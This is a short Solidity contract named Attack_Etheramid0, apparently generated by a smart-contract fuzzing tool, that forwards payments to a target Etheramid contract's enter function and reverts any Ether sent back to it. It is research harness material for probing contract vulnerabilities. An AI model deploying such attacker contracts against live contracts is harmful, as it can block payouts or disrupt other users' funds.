pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/Etheramid.sol";

contract Attack_Etheramid0 {

  Etheramid public target_contract;

  function Attack_Etheramid0(address _targetContract) public payable {
      target_contract = Etheramid(_targetContract);
  } 

  function vultron_enter(uint256 vultron_amount, address inviter) public payable{
    target_contract.enter.value(vultron_amount)(inviter);
  } 

  function() public payable {
    revert();
  }
} 
